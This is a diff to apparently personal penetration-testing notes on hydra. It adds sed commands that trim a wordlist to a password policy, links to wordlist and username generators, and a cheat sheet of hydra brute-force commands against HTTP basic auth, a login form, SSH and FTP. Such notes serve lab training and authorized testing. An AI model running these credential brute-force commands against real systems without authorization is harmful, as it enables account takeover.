@@ -30,9 +30,28 @@ Examples:
 
 ### Custom Wordlist with hydra
 
-Please Refer to \[this]\([#creating-wordlists](general-tools/hashcat.md#creating-wordlists "mention"))
+Please refer to Hashcat section for creating wordlists
 
+```bash
+sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+```
 
+&#x20;for omangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git).
 
+### Custom Username List
 
+One such tool we can use is [Username Anarchy](https://github.com/urbanadventurer/username-anarchy).
+
+## Random CheatSheet
+
+```
+hydra -h 	hydra help
+hydra -C wordlist.txt SERVER_IP -s PORT http-get / 	Basic Auth Brute Force - Combined Wordlist
+hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get / 	Basic Auth Brute Force - User/Pass Wordlists
+hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" 	Login Form Brute Force - Static User, Pass Wordlist
+hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4 	SSH Brute Force - User/Pass Wordlists
+hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 	FTP Brute Force - Static User, Pass Wordlist
+```
 
